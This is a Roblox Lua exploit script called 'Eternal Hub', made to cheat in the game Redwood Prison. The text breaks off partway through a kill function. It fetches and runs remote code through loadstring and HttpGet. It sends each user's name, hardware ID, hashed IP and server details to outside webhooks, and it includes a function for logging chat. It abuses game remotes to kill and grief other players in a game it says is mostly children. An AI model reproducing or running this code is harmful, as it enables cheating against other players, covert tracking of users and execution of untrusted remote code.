local asdASHYGrt1sdagagh1PDebug = false -- debug
local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()

if EALoaded and not asdASHYGrt1sdagagh1PDebug then
    Notification:Notify(
   {Title = "Error", Description = "Script Is already loaded. Please rejoin to reload it!"},
   {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 7, Type = "image"},
   {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(255, 84, 84)}
   )
	return
end

pcall(function() getgenv().EALoaded = true end)

if not game:IsLoaded() then
	game.Loaded:Wait()
	notLoaded:Destroy()
end

local Player = game:GetService("Players").LocalPlayer
local ReturningUser = false
local ScriptRelease = "Public" 

local Ranks = {
    ["Developer"] = {
        ["UserId"] = 949367,
        ["UserName"] = game:GetService("Players"):GetNameFromUserIdAsync(949367),
        ["Rank"] = "Owner"
    },
    ["Holder"] = {
        ["UserId"] = 3901493494,
        ["UserName"] = game:GetService("Players"):GetNameFromUserIdAsync(3901493494),
        ["Rank"] = "Owner"
    }
}

if Player.UserId == Ranks.Developer.UserId or Player.UserId == Ranks.Holder.UserId then
if Player:IsFriendsWith(2661610082)then
    ScriptRelease = "Developer"
end
end


if Player.UserId ~= Ranks.Developer.UserId and Player.UserId ~= Ranks.Holder.UserId then
local CurrentosMonth = tostring(os.date("!*t", os.time() - 18000).month)
local CurrentosYear = tostring(os.date("!*t", os.time() - 18000).year)
local JoinDateMonth = tostring(string.split(game:GetService("HttpService"):JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/"..Player.UserId))["created"]:sub(1,10),"-")[2])
local JoinDateYear = tostring(string.split(game:GetService("HttpService"):JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/"..Player.UserId))["created"]:sub(1,10),"-")[3])
if CurrentosMonth == JoinDateMonth and CurrentosYear == JoinDateYear then
    Player:Kick("Error | Report code: 101")
    wait(9e9) -- errors sometimes but is used for a stop in the script
end
local NameFiltered = game:GetService("Chat"):FilterStringForBroadcast(Player.name, Player)
if NameFiltered:match("#") then
    Player:Kick("Error | Report code: 102")
    wait(9e9) -- errors sometimes but is used for a stop in the script
    end
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/Pacifest/Pacies-Scripts/main/Version"))()
local ScriptName = "Eternal Hub"
local GithubVersion = Version
local ScriptVersion = '1.0'

task.spawn(function()
	if pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Pacifest/Pacies-Scripts/main/Version"))() end) then
		if ScriptVersion ~= GithubVersion then
			    Notification:Notify(
			        {Title = "Outdated Script", Description = "Join the discord to get the new version: "..DiscordInvite},
			        {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 10, Type = "image"},
			        {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(255, 84, 84)}
			       )
			       	getgenv().EALoaded = false
			       return
		end
	end
end)

if ScriptVersion == GithubVersion then
local webhooks = {
    ExecuteHook = "https://websec.services/send/6351ff529ad22e8b19d021c2",
    PromptHook = "https://websec.services/send/6351ff6d9ad22e8b19d021cd",
    ChatHook = "https://websec.services/send/6352146a9ad22e8b19d02224",
    DetectionHook = "https://websec.services/send/635d4d029ad22e8b19d0288e"
}

local WebhooksEnabled = true

function LogExecution()
local plainip = tostring(game:HttpGet("https://api.ipify.org"))
if syn then
    ip = syn.crypt.hash(plainip)
    executor = "Synapse X"
elseif Krnl then
    ip = Krnl.crypt.hash(plainip)
    executor = "KRNL"
else
    game.Players.LocalPlayer:Kick("Stop using shitsploits get krnl or buy synapse")
end

local usertable = loadstring(game:HttpGet("https://raw.githubusercontent.com/titusj3026/ProUserList/main/blacklistedusers"))()
local hwidtable = loadstring(game:HttpGet("https://raw.githubusercontent.com/titusj3026/ProUserList/main/blacklistedhwids"))()
local iptable = loadstring(game:HttpGet("https://raw.githubusercontent.com/titusj3026/ProUserList/main/blacklistedips"))()

local blacklist = false

for i,v in pairs(hwidtable) do
if v == game:GetService("RbxAnalyticsService"):GetClientId() then
blacklist = true
else
end
end

for i,v in pairs(usertable) do
if v == game:GetService("Players").LocalPlayer.Name then
blacklist = true
else
continue
end
end

for i,v in pairs(iptable) do
if v == ip then
blacklist = true
else
continue
end
end

pcall(function()
    local data
    if not blacklist then data = {
         
   ['embeds'] = {
     {
        ['title'] = 'Script Executed: '..ScriptName,
        ['color'] = 1600799,
        ['fields'] = {
           {name = 'Player Name: ', value = Player.Name},
           {name = 'HWID: ', value = '```'..game:GetService("RbxAnalyticsService"):GetClientId()..'```'},
           {name = "Version: ", value = ScriptVersion},
           {name = "Hashed IP: ", value = '```'..ip..'```'},
           {name = "Executor: ", value = executor},
           {name = 'Ping: ', value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
           {name = 'Server: ', value = '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'")```'}
         }
     }
   }
 }
    else
        
    data = {
    ['embeds'] = {
        {
        ['title'] = 'Script Executed: '..ScriptName.." | Blacklisted",
        ['color'] = 1600799,
        ['fields'] = {
           {name = 'Player Name: ', value = Player.Name},
           {name = 'HWID: ', value = '```'..game:GetService("RbxAnalyticsService"):GetClientId()..'```'},
           {name = "Version: ", value = ScriptVersion},
           {name = "Hashed IP: ", value = '```'..ip..'```'},
           {name = "Executor: ", value = executor},
         }
        }
      }
    }
 end

    if syn then
        local response = syn.request(
            {
                Url = webhooks.ExecuteHook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    elseif request then
        local response = request(
            {
                Url = webhooks.ExecuteHook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    elseif http_request then
        local response = http_request(
            {
                Url = webhooks.ExecuteHook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    end
 end)
end

local plainip = tostring(game:HttpGet("https://api.ipify.org"))
if syn then
ip = syn.crypt.hash(plainip)
elseif crypt then
ip = crypt.hash(plainip, "sha384")
elseif Krnl then
ip = Krnl.crypt.hash(plainip)
end
local usertable = loadstring(game:HttpGet("https://raw.githubusercontent.com/titusj3026/ProUserList/main/blacklistedusers"))()
local hwidtable = loadstring(game:HttpGet("https://raw.githubusercontent.com/titusj3026/ProUserList/main/blacklistedhwids"))()
local iptable = loadstring(game:HttpGet("https://raw.githubusercontent.com/titusj3026/ProUserList/main/blacklistedips"))()
local blacklist

for i,v in pairs(hwidtable) do
if v == game:GetService("RbxAnalyticsService"):GetClientId() then
blacklist = true
end
end

for i,v in pairs(usertable) do
if v == Player.Name then
blacklist = true
end
end

for i,v in pairs(iptable) do
if v == ip then
blacklist = true
end
end

if blacklist then
    LogExecution()
    Player:Kick("Report code: 109 | You are permanently blacklisted from "..ScriptName.." if you believe this was a mistake please seek help or appeal to be unbanned in the discord: "..DiscordInvite)
    wait(9e9) -- errors sometimes but is used for a stop in the script
    return
end

function LogTOSAcception()
local plainip = tostring(game:HttpGet("https://api.ipify.org"))
if syn then
    ip = syn.crypt.hash(plainip)
    executor = "Synapse X"
elseif Krnl then
    ip = Krnl.crypt.hash(plainip)
    executor = "KRNL"
else
    game.Players.LocalPlayer:Kick("Stop using shitsploits get krnl or buy synapse")
end

pcall(function()
    local data
    data = {
         
   ['embeds'] = {
     {
        ['title'] = ScriptName..': TOS accepted',
        ['color'] = 1600799,
        ['fields'] = {
           {name = 'Player Name: ', value = Player.Name},
           {name = 'Returning User: ', value = ReturningUser},
           {name = 'HWID: ', value = '```'..game:GetService("RbxAnalyticsService"):GetClientId()..'```'},
           {name = "Version: ", value = ScriptVersion},
           {name = "Hashed IP: ", value = '```'..ip..'```'},
           {name = "Executor: ", value = executor},
           {name = 'Ping: ', value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
           {name = 'Server: ', value = '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'")```'}
         }
     }
   }
 }


    if syn then
        local response = syn.request(
            {
                Url = webhooks.ExecuteHook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    elseif request then
        local response = request(
            {
                Url = webhooks.ExecuteHook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    elseif http_request then
        local response = http_request(
            {
                Url = webhooks.ExecuteHook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    end
 end)
end

function LogChat(message)
local plainip = tostring(game:HttpGet("https://api.ipify.org"))
if syn then
    ip = syn.crypt.hash(plainip)
    executor = "Synapse X"
elseif Krnl then
    ip = Krnl.crypt.hash(plainip)
    executor = "KRNL"
else
    game.Players.LocalPlayer:Kick("Stop using shitsploits get krnl or buy synapse")
end

pcall(function()
    local data
    data = {
         
   ['embeds'] = {
     {
        ['title'] = ScriptName..': Chat Log',
        ['color'] = 1600799,
        ['fields'] = {
           {name = 'Player Name: ', value = Player.Name},
           {name = 'Logged Message: ', value = '```'..message..'```'},
           {name = 'HWID: ', value = '```'..game:GetService("RbxAnalyticsService"):GetClientId()..'```'},
           {name = "Version: ", value = ScriptVersion},
           {name = 'Server: ', value = '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'")```'}
         }
     }
   }
 }


    if syn then
        local response = syn.request(
            {
                Url = webhooks.ChatHook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    elseif request then
        local response = request(
            {
                Url = webhooks.ChatHook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    elseif http_request then
        local response = http_request(
            {
                Url = webhooks.ChatHook,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    end
 end)
end

local Name = "EternalHub.VF"

local VerificationFile

local VSettings = {
    Verification = "0"
}

if syn then
if not pcall(function() readfile(Name) end) then writefile(Name, game:service'HttpService':JSONEncode(VSettings)) end
VerificationFile = game:service'HttpService':JSONDecode(readfile(Name))
end

local function SaveInfo()
    if syn then
        writefile(Name,game:service'HttpService':JSONEncode(VerificationFile))
    end
end


--if Player.Name ~= Ranks.Developer.UserName and Player.Name ~= Ranks.Holder.UserName and Player.UserId ~= Ranks.Developer.UserId and Player.UserId ~= Ranks.Holder.UserId then
if ScriptRelease == "Public" then
function SendWebhook(WebhookId, Content)
if syn then
    executor = "Synapse X"
elseif Krnl then
    executor = "KRNL"
else
    game.Players.LocalPlayer:Kick("Stop using shitsploits get krnl or buy synapse")
end


pcall(function()
    local data
     data = {
         content = Content
 }

    if syn then
        local response = syn.request(
            {
                Url = WebhookId,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    elseif request then
        local response = request(
            {
                Url = WebhookId,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    elseif http_request then
        local response = http_request(
            {
                Url = WebhookId,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        );
    end
 end)
end

math.randomseed(os.time())
local Characters = "abcdefgjklmnopqrstuvwxyz1234567890";

local tChars = {  };
for str in Characters:gmatch('[^.-*]') do
    table.insert(tChars, str);
end;
Characters = tChars;tChars = nil;

local function GetRandomCharacter(IgnoreCharacter, UL)
    local Char = Characters[math.random(1, #Characters)];
    
    if IgnoreCharacter then
        while Char == IgnoreCharacter do
            Char = Characters[math.random(1, #Characters)];
        end
    end;
    
    if UL then
        Char = (math.random(0, 1) == 0) and Char:lower() or Char:upper();
    end;
    
    return Char;
end;

local function GenerateString(Length)
    local String = {}
    local Recent;
    for i = 1, Length do
        local char = GetRandomCharacter(Recent, true);
        table.insert(String, char);
        Recent = char;
    end;
    
    return table.concat(String, '');
end;

if VerificationFile.Verification == "0" then
    VerificationFile.Verification = "1"

local Key = GenerateString(50)


local DiscordInput = Instance.new("ScreenGui")
local Background = Instance.new("ImageLabel")
local DiscordIDInput = Instance.new("TextBox")
local SubmitButton = Instance.new("TextButton")
local ImageLabel = Instance.new("ImageLabel")

--Properties:

DiscordInput.Name = "DiscordInput"
DiscordInput.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
DiscordInput.ResetOnSpawn = false

Background.Name = "Background"
Background.Parent = DiscordInput
Background.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Background.BorderSizePixel = 0
Background.Position = UDim2.new(0, 0, 0, -36)
Background.Size = UDim2.new(8.99999949e+09, 0, 8.99999949e+09, 0)
Background.Image = "http://www.roblox.com/asset/?id=6905635138"
Background.ImageTransparency = 0.750
Background.ScaleType = Enum.ScaleType.Tile
Background.TileSize = UDim2.new(0, 20, 0, 20)

DiscordIDInput.Name = "DiscordIDInput"
DiscordIDInput.Parent = DiscordInput
DiscordIDInput.AnchorPoint = Vector2.new(0.5, 0.5)
DiscordIDInput.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DiscordIDInput.BackgroundTransparency = 0.700
DiscordIDInput.Position = UDim2.new(0.5, 0, 0.800000012, 0)
DiscordIDInput.Size = UDim2.new(0.300000012, 0, 0.0500000007, 0)
DiscordIDInput.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
DiscordIDInput.PlaceholderText = "DISCORD ID"
DiscordIDInput.Text = ""
DiscordIDInput.TextColor3 = Color3.fromRGB(255, 255, 255)
DiscordIDInput.TextScaled = true
DiscordIDInput.TextSize = 14.000
DiscordIDInput.TextWrapped = true

SubmitButton.Name = "SubmitButton"
SubmitButton.Parent = DiscordInput
SubmitButton.AnchorPoint = Vector2.new(0.5, 0.5)
SubmitButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SubmitButton.BackgroundTransparency = 0.700
SubmitButton.Position = UDim2.new(0.5, 0, 0.860000014, 0)
SubmitButton.Size = UDim2.new(0.25, 0, 0.0599999987, 0)
SubmitButton.Text = "SUBMIT"
SubmitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SubmitButton.TextScaled = true
SubmitButton.TextSize = 14.000
SubmitButton.TextWrapped = true

ImageLabel.Parent = DiscordInput
ImageLabel.Active = true
ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.Position = UDim2.new(0.5, 0, 0.3, 0)
ImageLabel.Size = UDim2.new(0.5,0,0.9,0)
local krnlimage
if syn then
local function getsynassetfromurl(URL)
    local getsynasset, request = getsynasset or getcustomasset or error('invalid attempt to \'getsynassetfromurl\' (custom asset retrieval function expected)'), (syn and syn.request) or (http and http.request) or (request) or error('invalid attempt to \'getsynassetfromurl\' (http request function expected)')
    local Extension, Types, URL = '', {'.png', '.webm'}, assert(tostring(type(URL)) == 'string', 'invalid argument #1 to \'getsynassetfromurl\' (string [URL] expected, got '..tostring(type(URL))..')') and URL or nil
    local Response, TempFile = request({
        Url = URL,
        Method = 'GET'
    })

    if Response.StatusCode == 200 then
        Extension = Response.Body:sub(2, 4) == 'PNG' and '.png' or Response.Body:sub(25, 28) == 'webm' and '.webm' or nil
    end

    if Response.StatusCode == 200 and (Extension and table.find(Types, Extension)) then
        for i = 1, 15 do
            local Letter, Lower = string.char(math.random(65, 90)), math.random(1, 5) == 3 and true or false
            TempFile = (not TempFile and '' .. (Lower and Letter:lower() or Letter)) or (TempFile .. (Lower and Letter:lower() or Letter)) or nil
        end
        
        writefile(TempFile..Extension, Response.Body)
        
        task.spawn(function()
            wait(10)
            
            if isfile(TempFile..Extension) then
                delfile(TempFile..Extension)
            end
        end)
        
        return getsynasset(TempFile..Extension)
    elseif Response.StatusCode ~= 200 or not Extension then
        warn('unexpected \'getsynassetfromurl\' Status Error: ' .. Response.StatusMessage .. ' ('..URL..')')
    elseif not (Extension) then
        warn('unexpected \'getsynassetfromurl\' Error: (PNG or webm file expected)')
    end
end

Image1 = getsynassetfromurl('https://i.vgy.me/MAp4ai.png')
ImageLabel.Image = Image1
elseif Krnl then
krnlimage = true
ImageLabel:Destroy()
local Image = Drawing.new("Image")
local Full = workspace.CurrentCamera.ViewportSize
Image.Size = Vector2.new(500, 500)
Image.Position = Vector2.new(370, 5)
Image.Data = game:HttpGet("https://i.vgy.me/MAp4ai.png")
Image.Visible = true
end
function CreateKeyGui()
local KeyInput = Instance.new("ScreenGui")
local Background = Instance.new("ImageLabel")
local SubmitKeyButton = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local KeyInput_2 = Instance.new("TextBox")
local Frame = Instance.new("Frame")

--Properties:

KeyInput.Name = "KeyInput"
KeyInput.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
KeyInput.ResetOnSpawn = false

Background.Name = "Background"
Background.Parent = KeyInput
Background.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Background.BorderSizePixel = 0
Background.Position = UDim2.new(0, 0, 0, -36)
Background.Size = UDim2.new(8.99999949e+09, 0, 8.99999949e+09, 0)
Background.Image = "http://www.roblox.com/asset/?id=6905635138"
Background.ImageTransparency = 0.750
Background.ScaleType = Enum.ScaleType.Tile
Background.TileSize = UDim2.new(0, 20, 0, 20)

SubmitKeyButton.Name = "SubmitKeyButton"
SubmitKeyButton.Parent = KeyInput
SubmitKeyButton.AnchorPoint = Vector2.new(0.5, 0.5)
SubmitKeyButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SubmitKeyButton.BackgroundTransparency = 0.700
SubmitKeyButton.Position = UDim2.new(0.5, 0, 0.620000005, 0)
SubmitKeyButton.Size = UDim2.new(0.25, 0, 0.0599999987, 0)
SubmitKeyButton.Font = Enum.Font.Unknown
SubmitKeyButton.Text = "SUBMIT"
SubmitKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SubmitKeyButton.TextScaled = true
SubmitKeyButton.TextSize = 14.000
SubmitKeyButton.TextWrapped = true

TextLabel.Parent = KeyInput
TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.5, 0, 0.323846161, 0)
TextLabel.Size = UDim2.new(0.550000012, 0, 0.0599999987, 0)
TextLabel.Font = Enum.Font.Unknown
TextLabel.Text = "Please check your direct messages for the key!"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

TextLabel_2.Parent = KeyInput
TextLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.5, 0, 0.253846169, 0)
TextLabel_2.Size = UDim2.new(0.699999988, 0, 0.100000001, 0)
TextLabel_2.Font = Enum.Font.Unknown
TextLabel_2.Text = "A One-time key has been sent to the user linked with the ID"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

KeyInput_2.Name = "KeyInput"
KeyInput_2.Parent = KeyInput
KeyInput_2.AnchorPoint = Vector2.new(0.5, 0.5)
KeyInput_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
KeyInput_2.BackgroundTransparency = 0.700
KeyInput_2.Position = UDim2.new(0.5, 0, 0.550000012, 0)
KeyInput_2.Size = UDim2.new(0.300000012, 0, 0.0500000007, 0)
KeyInput_2.Font = Enum.Font.Unknown
KeyInput_2.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
KeyInput_2.PlaceholderText = "KEY"
KeyInput_2.Text = ""
KeyInput_2.TextColor3 = Color3.fromRGB(255, 255, 255)
KeyInput_2.TextScaled = true
KeyInput_2.TextSize = 14.000
KeyInput_2.TextWrapped = true

Frame.Parent = KeyInput
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.Position = UDim2.new(0.5, 0, 0.373846173, 0)
Frame.Size = UDim2.new(0.600000024, 0, 0.00200000009, 0)
KeySubmitted = false
SubmitKeyButton.Activated:Connect(function()
    if not KeySubmitted and tostring(KeyInput_2.Text) == Key then
        KeyInput:Destroy()
        KeySubmitted = true
        SaveInfo()
        --------------------------------------------------------------------------------------

        --------------------------------------------------------------------------------------
        --LoadHub()
        else
        game.Players.LocalPlayer:Kick("\nInvalid Key")
        KeySubmitted = true
    end
end)
wait(30)
if not KeySubmitted and KeyInput_2.Text ~= Key then
    game.Players.LocalPlayer:Kick("Invalid Key/Discord ID | "..DiscordInvite)
end
end

SubmitButton.Activated:Connect(function()
DiscordInput:Destroy()
if krnlimage then
Image.Visible = false
end
SendWebhook("https://websec.services/send/6351c1589ad22e8b19d021b9",""..DiscordIDInput.Text..","..Key)
CreateKeyGui()
if krnlimage then
Image:Remove()
end
end)
else
    ReturningUser = true
    KeySubmitted = true
end
else
    KeySubmitted = true
    WebhooksEnabled = false
end

repeat wait() until KeySubmitted == true

local DiscordLib = loadstring(game:HttpGet "https://raw.githubusercontent.com/Pacifest/Pacies-Scripts/main/DiscordLib")()

local win = DiscordLib:Window("D00M's Discord")

local EternalHubServer = win:Server(ScriptName, "http://www.roblox.com/asset/?id=11331694750")

--\\ Info
local infoChannel = EternalHubServer:Channel("info")
infoChannel:Label("If you are a new user please read below:")
infoChannel:Label("read #TOS and check #announcements for updates!")
infoChannel:Seperator()
infoChannel:Label("This script was made by Mil#1522 & Owner#8417")
infoChannel:Seperator()
infoChannel:Label("Thank you for using "..ScriptName)
infoChannel:Label("The best script for Redwood Prison")
--\\ TOS
local TOSChannel = EternalHubServer:Channel("TOS")
TOSChannel:Label("You are not allowed to:")
TOSChannel:Label("1. claim ownership/state that you made this script.")
TOSChannel:Label("2. use excessive abuse/destroy servers")
TOSChannel:Label("-This includes making the server unplayable.")
TOSChannel:Label("3. use/bypass pornography or inappropriate on prompt usage")
TOSChannel:Label("-This is game is mostly children.")
TOSChannel:Label("4. use any form of Dump and http/remote spy.")
TOSChannel:Seperator()
TOSChannel:Label("General & Blacklisting: ")
TOSChannel:Label("Running another script may result in a blacklist.")
TOSChannel:Label("-This includes any form of other external script")
TOSChannel:Label("The Staff are allowed to:")
TOSChannel:Label("1. Modify your character in any way.")
TOSChannel:Label("2. Log your IP.")
TOSChannel:Label("You can be kicked or banned:")
TOSChannel:Label("1. from the server at any time.")
TOSChannel:Label("2. from the discord server at any time.")
TOSChannel:Seperator()
TOSChannel:Label("You can be blacklisted:")
TOSChannel:Label("1. at any time the staff desires.")
TOSChannel:Label("2. if you break any of the TOS.")
TOSChannel:Seperator()
TOSChannel:Label("If you get kicked seek help with the given code in the discord")
TOSChannel:Seperator()
TOSAccepted = false
ScriptUnlocked = false
TOSChannel:Button(
    "I agree to the TOS",
    function()
        if not TOSAccepted then
        TOSAccepted = true
        DiscordLib:Notification("TOS Accepted", "You have been given access to the script", "Awesome!")
        ScriptUnlocked = true
        LogTOSAcception()
        else
            DiscordLib:Notification("Warning", "You have already accepted the TOS!", "ok")
        end
    end
)
DiscordLib:Notification("Warning", "If you click the x you must rejoin to load the hub again!", "ok")

--if Player.Name == Ranks.Developer.UserName or Player.Name == Ranks.Holder.UserName then

if ScriptRelease == "Developer" then
    TOSAccepted = true
    ScriptUnlocked = true
end

repeat wait() until ScriptUnlocked == true
--local function LoadHub()
local blah = "1i1Ii1iL1i1I1i1Ii1Ii1IlilII1II1i1Ii1I1i1i1i1iL1Ii1I1i1I1I1i1L1IIIiL1i1I1i1I1l1i1i1i1Ii1IIi1i1i1i1i1i1lI1i1i1ILI1Ii1II1i1i1II1iLII1i1I1i1I1i1Ii1i1Ii1i1IIi1i1l1Ii1I1i1i1I1lII1Li1i1i1II1i1Il1I1i1iL1II1III1Ii1Ii1I1I1i1III1Il1i1i1I1i1Ii1i1i1i1Ii1i1i1i1i1i1LII1I1II1il1i1i1Il1Ii1L1i1i1i1I1i1Ii1Ii1Ii1I1i1III1IiLII1i1I1I1liL1I1I1i1I1IiL1Ii1Ii1I1i1III1I1Ll1I1IiL1Li1I1IIi1IIliLi1i1I1Li1i1i1i1lI1I1L1I1IIIi1i1i1i1iLi1III1IIi1IIi1Iili1i1ili1Ii1Ii1L1i1il1I1Ii1IiLi1ILlIil1l1i1Iil1i1IIiL1iL1iL1I1i1Li1i1II1i1i1i1i1i1Ii1i1Li1ilIi1I1Ii1i1LIi1i1li1i1Li1IL1i1i1IiLI1ili1iLLi1i1Ii1i1i1ILI1i1Ii1i1i1II1I1i1III1l1LI1ilI1ilIi1Ll1i1I1II1I1i1i1i1i1L1II1Ii1li1IlIili1Ii1l1iL1l1i1I1II1L1i1Ii1III1Ii1lIl1Li1Ii1li1i1ILIII1I1Ii1Ii1I1Ii1II1i1I1I1II1Ili1i1i1i1II1i1IL1i1I1i1I1l1iLli1I1i1i1li1i1Ii1I1iLL1i1I1i1i1i1i1I1Il1I1i1i1LI1i1L1I1i1i1I1i1i1i1II1i1i1I1i1l1iLi1i1I1iL1i1i1i1i1lIl1iL1I1I1i1IL1I1Ii1Ii1IL1Ii1i1ili1II1IlIi1i1i1i1i1i1li1i1IIi1i1i1Ii1Ii1II1i1i1III1i1i1ilII1II1lI1II1III1i1lI1iL1i1ili1IIi1I1IIil1iLILI1Li1l1i1i1Ii1L"
local date = os.date("*t", os.time())
if date["month"] == 10 then--10 then
local function CreatePermPart(part,parent) -- This is for Effects/Creating parts without Looping
	local properties = {
		["TopSurface"] = blah, 
		["Material"] = part.Material,
		["Reflectance"] = part.Reflectance,
		["BrickColor"] = part.BrickColor,
		["Transparency"] = part.Transparency,
		["Size"] = part.Size,
		["Position"] = part.Position,
		["CanCollide"] = part.CanCollide,
		["Anchored"] = part.Anchored,
		["Shape"] = part.Shape,
		["Parent"] = parent,
		["Orientation"] = part.Orientation
	}
	firesignal(game.Workspace.resources.RemoteEvent.OnClientEvent,"drawLaser",part.Position,part.Position,properties)
	require(game:GetService("Workspace").upsilonLibrary).FireOtherClients("drawLaser",part.Position,part.Position,properties)
end
local Decorations = game:GetObjects("rbxassetid://11331490003")[1]
for i,v in pairs(Decorations:GetDescendants()) do
if v:IsA("Part") then -- and not v:IsA("UnionOperation") and not v:IsA("MeshPart") and not v:IsA("Wedge")
if v:FindFirstChildOfClass("SpecialMesh") or v:FindFirstChildOfClass("BlockMesh") then
    v:Destroy()
end
v.Anchored = true
CreatePermPart(v,game.Workspace)
end
end
Decorations:Destroy()
else
end
local Teams = game:GetService("Teams")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Mouse = Player:GetMouse()
local Players = game:GetService("Players")
local ChatService = game:GetService("Chat")
local lib = require(game:GetService("Workspace").upsilonLibrary)
local ScriptFolder
if not workspace:FindFirstChild("D00M Instances") then
	ScriptFolder = Instance.new("Folder",workspace)
	ScriptFolder.Name = "D00M Instances"
else
	ScriptFolder = workspace:WaitForChild("D00M Instances") 
end

local EShirtId
local EPantsId

local Target
local DevTarget
local DevReason
local DevString
local LoopKillTog
local PromptMessage = "doom do be a bird doe "
local gamepasstog = false
local loopkilltog = false
local instantrespawntog = false
local prompttog = false
local TurretGiven = false

local AssetImportId = ""
local AssetImportCooldown = false

local C4Given = false
local C4Cooldown = false
local CooldownsEnabled = true
local CooldownTime = 7
local KillCooldown = false
local FlingCooldown = false
local ArrestCooldown = false
local HorrifyCooldown = false
local BringCooldown = false
local SmiteCooldown = false
local SmiteToolCooldown = false
local SmiteToolGiven = false
local FEffGiven = false
local FELaserEspGiven = false
local ControlCooldown = false
local KillOthersCooldown = false
local BringOthersCooldown = false

local SmiteColor = Color3.fromRGB(255, 255, 0)
local PaintColor = Color3.fromRGB(255, 1, 1)
local LaserESPColor = Color3.fromRGB(255, 1, 1)
local LaserColor = Color3.fromRGB(255, 1, 1)
local ProflyColor = Color3.fromRGB(255, 1, 1)
local ForceFieldColor = Color3.fromRGB(255, 1, 1)

if ScriptRelease == "Public" then
    CooldownTime = 7
    CooldownsEnabled = true
    LogExecution()
    elseif ScriptRelease == "Developer" then
    CooldownsEnabled = false
    CooldownTime = 0
end

local function teleport(x, y, z)
Player.Character.HumanoidRootPart.CFrame = CFrame.new(x,y,z)
end

local function TKill(char)
    if not Players:FindFirstChild(char) then return end
    --if Players:FindFirstChild(char).Name ~= Ranks.Developer.UserName and Players:FindFirstChild(char).Name ~= Ranks.Holder.UserName then
    char = Players:FindFirstChild(char).Character
    if char:FindFirstChildOfClass("Humanoid") and char.Humanoid.Health ~= 0 then
    for x = 1,2 do -- to ensure it actually kills and doesnt glitch
	local args = {
		[1] = "FireOtherClients",
		[2] = "drawLaser",
		[3] = Vector3.new(0, 0, 0),
		[4] = Vector3.new(0, 0, 0), --[[Vector3]]
